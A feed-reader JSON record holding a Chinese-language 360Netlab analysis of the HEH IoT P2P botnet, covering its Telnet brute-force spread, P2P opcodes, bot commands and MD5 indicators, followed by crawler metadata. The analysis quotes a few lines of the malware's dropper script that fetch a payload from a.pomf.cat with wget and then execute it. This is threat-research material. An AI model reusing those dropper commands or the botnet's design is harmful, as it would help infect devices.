{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-10 00:44:13","updatedTime":"2020-10-10 00:44:13","title":"HEH Botnet, 一个处于开发阶段的 IoT P2P Botnet","link":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","description":"<h2 id=\"-\">概述</h2><p>近期 360Netlab 未知威胁检测系统捕获到一批未知恶意家族的样本，这一批样本支持的 CPU 架构有 x86(32/64), ARM(32/64), MIPS(MIPS32/MIPS-III) 以及 PPC，经过我们分析，将其命名为 <strong>HEH Botnet</strong>。HEH 是一个由 Go 语言编写的 IoT P2P Botnet，它的 P2P 协议不基于公开的任何 P2P 协议，而是自研协议。HEH 现阶段会通过暴力破解 <strong>23/2323</strong> 两个端口的 <strong>Telnet</strong> 服务来传播，而不针对特定设备。</p><p>基于以下两点，我们认为它还处于开发测试阶段：</p><ol><li>整个僵尸网络的运作机制还不太成熟；</li><li>部分指令还未实现。</li></ol><p>根据 <a href=\"https://github.com/0xjiayu/go_parser\">go_parser</a> 的解析结果，我们捕获的 HEH 样本由 <strong>Go 1.15.1</strong> 构建，构建样本用到的源码文件列表如下：</p><pre><code>/mnt/c/Users/brand/go/src/heh/attack.go\n/mnt/c/Users/brand/go/src/heh/commands.go\n/mnt/c/Users/brand/go/src/heh/structFun.go\n/mnt/c/Users/brand/go/src/heh/cryptotext.go\n/mnt/c/Users/brand/go/src/heh/httpserver.go\n/mnt/c/Users/brand/go/src/heh/killer.go\n/mnt/c/Users/brand/go/src/heh/main.go\n/mnt/c/Users/brand/go/src/heh/network.go\n/mnt/c/Users/brand/go/src/heh/peerlist.go\n/mnt/c/Users/brand/go/src/heh/portkill.go\n/mnt/c/Users/brand/go/src/heh/services.go\n/mnt/c/Users/brand/go/src/heh/telnet.go\n</code></pre><p>注意到该样本内部的项目名为 <strong>heh</strong>，正是因此，我们把它命名为 <strong>HEH Botnet</strong>。根据源码文件路径的特征，我们还可以确认的一点是，该家族样本是作者在 Windows 平台的 WSL 环境中构建而来。</p><h2 id=\"--1\">功能简述</h2><p>HEH Botnet 的样本包含三个功能模块：传播模块、本地 HTTP 服务模块和 P2P 模块。概要流程图如下：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png\" class=\"kg-image\"></figure><h2 id=\"--2\">详细分析</h2><h3 id=\"--3\">起始阶段</h3><p>我们捕获的 HEH Botnet 样本最初由一个名为 <strong>wpqnbw.txt</strong> 的恶意 Shell 脚本下载并执行的，该恶意 Shell 脚本会依次下载并执行所有 CPU 架构的恶意程序，恶意脚本和二进制程序都托管在 <strong>pomf.cat</strong> 站点。<strong>wpqnbw.txt</strong> 的开头部分内容(后续内容类似)：</p><pre><code>#!/bin/bash\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /\nwget hxxp://a.pomf.cat/xggxyk\nbusybox wget hxxp://a.pomf.cat/xggxyk\nchmod 777 xggxyk; busybox chmod 777 xggxyk; sh xggxyk \"$1 3\"</code></pre><p>恶意样本启动时传入的参数，第一个参数为一个 IP 地址，默认是本机外网 IP，理论上也可以是某个 Peer 的 IP 地址；第二个参数为 Daemon Flag，如果设置该参数为 <strong>3</strong>，样本启动后将会以守护进程的方式运行。</p><p>样本启动后，会根据端口号 Kill 掉一系列服务进程：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/kill_serv_by_ports.png\" class=\"kg-image\"></figure><p>然后，HEH 样本会在本地的 <strong>:80</strong> 端口启动一个 HTTP Server：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/start_http_serv.png\" class=\"kg-image\"></figure><p>这个 HTTP Server 的初始状态会设置 <code>:80/0</code> ~ <code>:80/9</code> 共 10 个 URI，对应 8 种语言的 《世界人权宣言》 和 2 个空内容。其中 <code>:80/0</code> 返回的是中文版的《世界人权宣言》：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/http_server.png\" class=\"kg-image\"></figure><p>8 种语言的《世界人权宣言》：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/human_right_decl.png\" class=\"kg-image\"></figure><p>这些初始状态的《世界人权宣言》内容，很快就会被样本从 Peer 的 HTTP 服务端口拉取的数据覆盖掉，也可以通过 P2P 协议中的特定指令来更新这些内容。</p><h3 id=\"p2p-\">P2P 模块</h3><p>HEH Botnet 的 P2P 模块初始化时，有两个关键步骤：</p><ol><li> 初始化 Peer List 对象，该对象是一个 Slice 类型的全局变量，初始长度为 <strong>1000</strong>。Go 语言定义如下：</li></ol><pre><code>package main\nimport &#34;net&#34;\n\ntype Peer struct {\n\taddr                 net.UDPAddr\n\texpirationTimer uint8\n}\n\nvar peerList []Peer\n</code></pre>\n<p>2. 更新 HTTP 响应数据。通过向 <code>argv[1]</code> <strong>:80</strong> 端口的 HTTP 服务请求 0~9 的 HTTP URI，来更新自己相应的数据。根据样本行为来看，后续这里更新的数据，是<strong>可执行的二进制文件</strong>。 </p><p>HEH Botnet 的 P2P 模块，主要由 3 个组件构成：</p><ol><li>Ping 组件：间隔 10s 每轮，每轮里隔 0.1s <strong>依次</strong>向每个 Peer 的 UDP 服务端口发 <strong>Ping</strong> 指令；</li><li>Peer 更新组件：间隔 10s 每轮，每轮里隔 0.1s <strong>随机</strong>向一个 Peer 的 UDP 服务端口发 <strong>Peer Upate</strong> 指令，对端收到该指令后，会检查自己的 Peer List 是否已包含该 Peer 地址信息，不包含的话则把该 Peer 地址信息加入自己的 Peer List；</li><li>UDP 服务监听组件：HEH Botnet 的本地 Peer 服务是一个 UDP 服务，该服务监听其他 Peer 发来的数据或指令，解析指令后进行相应的操作。</li></ol><p>这里重点介绍 HEH Botnet 的 UDP 服务监听组件。该组件有两个关键功能点：<strong>UDP 服务端口号生成</strong>和<strong>指令解析</strong>。</p><p>HEH Botnet 的 UDP 服务端口不是固定不变的，也不是随机生成的，而是根据 Peer 自己的公网 IP 进行数字计算得出。HEH Bot 每次收到一个新 Peer 的 IP 地址，都会根据该算法计算出 Peer 的 UDP 端口，并把这些信息打包存入自己的 Peer List 中。该端口生成算法在函数 <strong>main.portGenerator()</strong> 中实现，关键部分如下：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/port_gen.png\" class=\"kg-image\"></figure><p>HEH Bot 可解析的指令，分为两类：P2P 协议相关的功能指令(<strong>Protocol OpCode</strong>)和针对 Bot 的控制指令(<strong>Bot Cmd</strong>)。指令码位于 <strong>UDP 数据的第一个字节</strong>，分类如下：</p><table>\n<thead>\n<tr>\n<th>OpCode</th>\n<th style=\"text-align:center\">指令长度(Bytes)</th>\n<th style=\"text-align:left\">意义</th>\n<th style=\"text-align:left\">操作</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>2</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\">Ping</td>\n<td style=\"text-align:left\">向 Peer 回一个 Pong 指令</td>\n</tr>\n<tr>\n<td><strong>3</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\">Pong</td>\n<td style=\"text-align:left\">-</td>\n</tr>\n<tr>\n<td><strong>4</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\">Announce(声明自己是一个 Peer)</td>\n<td style=\"text-align:left\">将 Peer 信息加入自己 Peer List，向 Peer 再回一个 Announce</td>\n</tr>\n<tr>\n<td><strong>5</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\">PeerUpdate(要求对方更新自己的信息)</td>\n<td style=\"text-align:left\">更新 Peer List</td>\n</tr>\n<tr>\n<td><strong>1</strong></td>\n<td style=\"text-align:center\">&#62; 0x229</td>\n<td style=\"text-align:left\">控制 Bot 执行指定 Command</td>\n<td style=\"text-align:left\">解析并执行 Bot Cmd</td>\n</tr>\n</tbody>\n</table>\n<p>当指令码为 <strong>1</strong> 的时候，代表该指令为针对 Bot 的控制指令码。此类指令前 0x229 Bytes 内容含义是固定的，其中依次包含校验用到的 Sha256 Value 和 PSS Signature，最后还有 8 Bytes 的额外校验字段；从 0x229 字节往后才是真正的指令数据。以 <strong>7</strong> 号 Bot Cmd(<strong>Cmd.UpdateBotFile</strong>) 为例，指令数据结构如下：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/bot_cmd_st.png\" class=\"kg-image\"></figure><p>HTH Bot 针对收到的 Bot Cmd 数据的校验分 3 步：</p><ol><li> 检查指令数据的长度，以及 Extra Flag； </li><li> 利用 PSS Signature 校验指令数据； </li><li> 检查最后真实数据的 Sha256 Hash。 </li></ol><p>后两步逻辑如下所示：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/cmd_verify.png\" class=\"kg-image\"></figure><p>其中，校验 PSS Signature 时用到的公钥为：</p><pre><code>-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3c1Jzopt9E4+cDwTMKUo\nuBSfu9DoFYctD6OIkiZqE1iF5sJPOr6xhU+nV9sebcAClnO9+6YvlKDIVVwjzNbm\njcfUAYyq8FSLJrifEYvT2LYkYYy/SNKcaaTmAKCJ3ACSXpjhcr6WW5/05ygBShVo\nE0q+fVhVTqnkOPpIowuHs9RH0DcuGsxKYXTQizuC0Xa0HrfUrnI7FWNSUfm8v1mA\n3FnlikNdTMrlRItnRCGIj+8tyiyvyQAi0/SWrfZLG+HzMgxf+wVBfD9H2XTUcUWX\nuoDIlSRIJJkN88dJ+uf1dlHlCqhF9TrimpzALq+OhSd1alUaf+PFINSrjNuIc+wU\n9cuYQeD6kMynXu7bKTVqKPz8M0EathmduOthNL7WUhcKUppyyBIfkVmH9cnxWcZu\njPpnGH9n5Djy1QaexRT9JBx7eNSps31cZ9/rQgO05SlA4KFZARCIXNPZmGOZmL8Y\n33dPu29ykF02kiOau6SyLgRW2bIudMCrhL82fSo6zSNCXOby8VE3j/BCfn2lx5oI\nn5ES65zs2GuF3DGfwheNLiaajV5belCOMCD07TjfBfHJz0hisTy5K1UHItqHSFCa\n9EijW7uk416Ulx0HHChKAQJ8Mn2AqD1WBR4Iu20WQENJNIT7ketyCCMwJH0mO3en\nLW2/t1GOPfXptXtNmdzp01sCAwEAAQ==\n-----END PUBLIC KEY-----\n</code></pre><p>HEH Bot 支持解析的 Bot Cmd 有如下几个：</p><table>\n<thead>\n<tr>\n<th>Cmd Code</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>0</strong></td>\n<td><strong>Restart</strong>: 重启 Bot</td>\n</tr>\n<tr>\n<td><strong>2</strong></td>\n<td><strong>Exit</strong>: 退出运行</td>\n</tr>\n<tr>\n<td><strong>3</strong></td>\n<td><strong>Attack</strong>: 发起攻击（<strong>未实现</strong>）</td>\n</tr>\n<tr>\n<td><strong>4</strong></td>\n<td><strong>Execute</strong>: 执行 Shell 命令</td>\n</tr>\n<tr>\n<td><strong>5</strong></td>\n<td><strong>Print</strong>: <strong>未实现</strong></td>\n</tr>\n<tr>\n<td><strong>6</strong></td>\n<td><strong>PeerUpdate</strong>: 更新 Peer List</td>\n</tr>\n<tr>\n<td><strong>7</strong></td>\n<td><strong>UpdateBotFile</strong>: 通过指定一个文件下载链接，让 Bot 去下载并更新 Bot 持有的文件内容。该文件会被 Bot 用作 HTTP Response Data</td>\n</tr>\n<tr>\n<td><strong>8</strong></td>\n<td><strong>SelfDestruct</strong>: 启动设备自毁</td>\n</tr>\n<tr>\n<td><strong>9</strong></td>\n<td><strong>Misc</strong>: <strong>未实现</strong></td>\n</tr>\n</tbody>\n</table>\n<p>目前来看，对整个 Botnet 最有用的功能是执行 Shell 命令、更新 Peer List 和 UpdateBotFile 这 3 个。代码中的 <strong>Attack</strong> 函数只是预留的空函数，并没有开始实现。由此可见，目前该 Botnet 还是处于扩张阶段，扩张后下一步的功能还没有实现。将来如果作者实现了其中的 <strong>Attack</strong> 指令，将会使 HEH Botnet 变得更加危险。</p>\n<p>Bot 内解析 Bot Cmd 的函数为 <strong>main.executeCommand()</strong> ，该函数的整体结构如下：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/exec_cmd_func_overview.png\" class=\"kg-image\"></figure><p>另外，当 Bot Cmd Code 为 <strong>8</strong> 时，Bot 将会通过下面一系列 Shell 命令实施设备自毁：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/self_destroy_cmd.png\" class=\"kg-image\"></figure><h3 id=\"-telnet-\">传播模块——Telnet 服务暴力破解</h3><p>在 Bot 把 P2P 模块运行起来之后，会以并行的方式执行针对 23,2323 两个端口的 Telnet 服务暴力破解任务，进而完成自身传播。</p><p>首先，Bot 会生成一个随机 IP 地址，然后会检查该 IP 地址是否 <strong>127.0.0.1</strong>：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/random_dip.png\" class=\"kg-image\"></figure><p>如果随即生成的 IP 地址不为 <strong>127.0.0.1</strong>，则会先对该 IP 进行扫描，如果在 23 或者 2323 端口开放了 Telnet 服务，就会进入暴力破解阶段。相关的函数如下：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/telnet_related_func.png\" class=\"kg-image\"></figure><p>暴力破解 Telnet 服务用到的口令字典以全局 Slice 变量的形式存在，其中用户名 <strong>171</strong> 个，密码 <strong>504</strong> 个：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/telnet_auth_dict.png\" class=\"kg-image\"></figure><p>如果暴破成功，Bot 会让实现主机来访问自己的 HTTP 服务，并执行通过 HTTP 相应获取的文件（即最新的 Bot 样本），从而完成传播：</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/send_payload.png\" class=\"kg-image\"></figure><h2 id=\"--4\">总结</h2><p>从 Bot 样本的分析结果来看，Bot 还有不少未完成的功能，有 3 个重要的指令功能并未实现。从它的网络结构来看，虽然 Bot 内部维护了一个 Peer List，并且 Peer 之间也有 Ping&#60;--&#62;Pong 通信，但 Bot 样本只能接收、解析控制指令，能向 Bot 发送真正的控制指令的，依然只有 Bot Master 一个人，即整个 Botnet 还是集中式控制模式。另外，通过本地 HTTP Server 来承载样本自身传播的机制还不完善。所以我们认为 HEH Botnet 还处于开发、测试的初期。</p><p>不过由于它支持的指令功能之丰富，内部代码清晰的模块化架构，以及还有破坏性极高的设备自毁功能，我们认为这是一个值得持续关注的 Botnet。</p><h2 id=\"--5\">联系我们</h2><p>感兴趣的读者，可以在 <a href=\"https://twitter.com/360Netlab\"><strong>twitter</strong></a> 或者在微信公众号 <strong>360Netlab</strong> 上联系我们。</p><h2 id=\"ioc\">IoC</h2><p>MD5:</p><pre><code>4c345fdea97a71ac235f2fa9ddb19f05\n66786509c16e3285c5e9632ab9019bc7\n6be1590ac9e87dd7fe19257213a2db32\n6c815da9af17bfa552beb8e25749f313\n984fd7ffb7d9f20246e580e15fd93ec7\nbd07315639da232e6bb4f796231def8a\nc1b2a59f1f1592d9713aa9840c34cade\nc2c26a7b2a5412c9545a46e1b9b37b0e\n43de9c5fbab4cd59b3eab07a81ea8715</code></pre>","descriptionType":"html","publishedDate":"Fri, 09 Oct 2020 02:26:21 +0000","feedId":45157,"bgimg":"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png","linkMd5":"4e5209dc889a2c56f65a465131cce3b8","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn28@2020_3/2020/10/09/16-44-17-298_60e3ab1de08195b5.webp","destWidth":1404,"destHeight":1244,"sourceBytes":76995,"destBytes":67018,"author":"JiaYu","articleImgCdnMap":{"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn28@2020_3/2020/10/09/16-44-17-298_60e3ab1de08195b5.webp","https://blog.netlab.360.com/content/images/2020/09/kill_serv_by_ports.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn63@2020_2/2020/10/09/16-44-24-891_1981d8cf274df658.webp","https://blog.netlab.360.com/content/images/2020/09/start_http_serv.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn36@2020_6/2020/10/09/16-44-33-772_3195c428f7fb8f60.webp","https://blog.netlab.360.com/content/images/2020/09/http_server.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn72@2020_3/2020/10/09/16-44-27-727_fed2f2fa887b029c.webp","https://blog.netlab.360.com/content/images/2020/09/human_right_decl.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn67@2020_1/2020/10/09/16-44-23-928_c78c3e90cc348006.webp","https://blog.netlab.360.com/content/images/2020/09/port_gen.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn44@2020_2/2020/10/09/16-44-22-079_20a21704bb9694bb.webp","https://blog.netlab.360.com/content/images/2020/09/bot_cmd_st.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn40@2020_1/2020/10/09/16-44-25-401_1dc3b6853b9751c4.webp","https://blog.netlab.360.com/content/images/2020/09/cmd_verify.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn52@2020_1/2020/10/09/16-44-24-274_a49bfa018663d940.webp","https://blog.netlab.360.com/content/images/2020/09/exec_cmd_func_overview.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn48@2020_1/2020/10/09/16-44-21-879_5f3df7002ac54502.webp","https://blog.netlab.360.com/content/images/2020/09/self_destroy_cmd.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn59@2020_3/2020/10/09/16-44-22-649_202e5c76bc818cf6.webp","https://blog.netlab.360.com/content/images/2020/09/random_dip.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn78@2020_2/2020/10/09/16-44-26-576_f89f0e713dce5e39.webp","https://blog.netlab.360.com/content/images/2020/09/telnet_related_func.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn76@2020_6/2020/10/09/16-44-21-400_902a70d8796bac27.webp","https://blog.netlab.360.com/content/images/2020/09/telnet_auth_dict.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn31@2020_3/2020/10/09/16-44-24-234_cfc353adb120fd30.webp","https://blog.netlab.360.com/content/images/2020/09/send_payload.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_1/2020/10/09/16-44-23-196_807dfd2b461e6e30.webp"},"publishedOrCreatedDate":1602261853343}],"record":{"createdTime":"2020-10-10 00:44:13","updatedTime":"2020-10-10 00:44:13","feedId":45157,"fetchDate":"Fri, 09 Oct 2020 16:44:13 +0000","fetchMs":2882,"handleMs":20,"totalMs":25415,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"3b815f166924abacecf011ee14a8b2ba","hostName":"us-019*","requestId":"a6dae377dcd149e9a70d21ac3f9fb8bd_45157","contentType":"text/xml; charset=utf-8","totalBytes":1657816,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":14,"articlesImgsGithubTotal":14,"successGithubMap":{"myreaderx25":1,"myreaderx7":1,"myreaderx16":1,"myreaderx6":1,"myreaderx21":1,"myreaderx10":1,"myreaderx4":1,"myreaderx12":1,"myreaderx2":1,"myreaderx1":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1,"myreaderx":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:37:14","updatedTime":"2020-09-07 05:55:16","id":45157,"name":"360 Netlab Blog - Network Security Research Lab at 360","url":"https://blog.netlab.360.com/rss/","subscriber":71,"website":null,"icon":"https://blog.netlab.360.com/favicon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx61/cdn59@2020_2/2020/09/06/21-55-13-480_11aad37390d7d139.png","description":"Network Security Research Lab at 360","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":67018,"tmpBodyImgCdnBytes":1590798,"tmpBgImgCdnBytes":0,"extra4":{"start":1602261849339,"total":0,"statList":[{"spend":3984,"msg":"获取xml内容"},{"spend":20,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":16295,"msg":"正文链接上传到cdn"}]},"extra5":14,"extra6":14,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/start_http_serv.png","sourceStatusCode":0,"sourceBytes":0,"destBytes":0,"feedId":45157,"totalSpendMs":12733,"convertSpendMs":0,"createdTime":"2020-10-10 00:44:18","host":"us-039*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[0],"sourceSize":"0","destSize":"0"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-018.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-039.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[0]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-006.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-031.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-014.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png","sourceStatusCode":200,"destWidth":1404,"destHeight":1244,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn28@2020_3/2020/10/09/16-44-17-298_60e3ab1de08195b5.webp","sourceBytes":76995,"destBytes":67018,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":4941,"convertSpendMs":49,"createdTime":"2020-10-10 00:44:13","host":"europe-23*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8,4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"75.2 KB","destSize":"65.4 KB","compressRate":"87%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/telnet_related_func.png","sourceStatusCode":200,"destWidth":683,"destHeight":147,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn76@2020_6/2020/10/09/16-44-21-400_902a70d8796bac27.webp","sourceBytes":14826,"destBytes":12600,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":3725,"convertSpendMs":8,"createdTime":"2020-10-10 00:44:18","host":"us-034*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14.5 KB","destSize":"12.3 KB","compressRate":"85%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/exec_cmd_func_overview.png","sourceStatusCode":200,"destWidth":2232,"destHeight":1434,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn48@2020_1/2020/10/09/16-44-21-879_5f3df7002ac54502.webp","sourceBytes":25565,"destBytes":20266,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":4238,"convertSpendMs":397,"createdTime":"2020-10-10 00:44:18","host":"us-002*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"25 KB","destSize":"19.8 KB","compressRate":"79.3%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/port_gen.png","sourceStatusCode":200,"destWidth":563,"destHeight":1245,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn44@2020_2/2020/10/09/16-44-22-079_20a21704bb9694bb.webp","sourceBytes":57195,"destBytes":70976,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":4495,"convertSpendMs":29,"createdTime":"2020-10-10 00:44:18","host":"us-014*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55.9 KB","destSize":"69.3 KB","compressRate":"124.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/self_destroy_cmd.png","sourceStatusCode":200,"destWidth":1084,"destHeight":1026,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn59@2020_3/2020/10/09/16-44-22-649_202e5c76bc818cf6.webp","sourceBytes":149642,"destBytes":182100,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":5283,"convertSpendMs":88,"createdTime":"2020-10-10 00:44:18","host":"us-031*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"146.1 KB","destSize":"177.8 KB","compressRate":"121.7%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/send_payload.png","sourceStatusCode":200,"destWidth":1465,"destHeight":1062,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_1/2020/10/09/16-44-23-196_807dfd2b461e6e30.webp","sourceBytes":100798,"destBytes":114700,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":5793,"convertSpendMs":358,"createdTime":"2020-10-10 00:44:18","host":"us-53*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"98.4 KB","destSize":"112 KB","compressRate":"113.8%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/human_right_decl.png","sourceStatusCode":200,"destWidth":1560,"destHeight":933,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn67@2020_1/2020/10/09/16-44-23-928_c78c3e90cc348006.webp","sourceBytes":104220,"destBytes":151460,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":6673,"convertSpendMs":155,"createdTime":"2020-10-10 00:44:18","host":"us-006*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"101.8 KB","destSize":"147.9 KB","compressRate":"145.3%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/telnet_auth_dict.png","sourceStatusCode":200,"destWidth":1627,"destHeight":375,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn31@2020_3/2020/10/09/16-44-24-234_cfc353adb120fd30.webp","sourceBytes":46612,"destBytes":72014,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":6928,"convertSpendMs":25,"createdTime":"2020-10-10 00:44:18","host":"europe61*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45.5 KB","destSize":"70.3 KB","compressRate":"154.5%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/cmd_verify.png","sourceStatusCode":200,"destWidth":1106,"destHeight":2109,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn52@2020_1/2020/10/09/16-44-24-274_a49bfa018663d940.webp","sourceBytes":163922,"destBytes":188614,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":7194,"convertSpendMs":108,"createdTime":"2020-10-10 00:44:18","host":"europe65*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"160.1 KB","destSize":"184.2 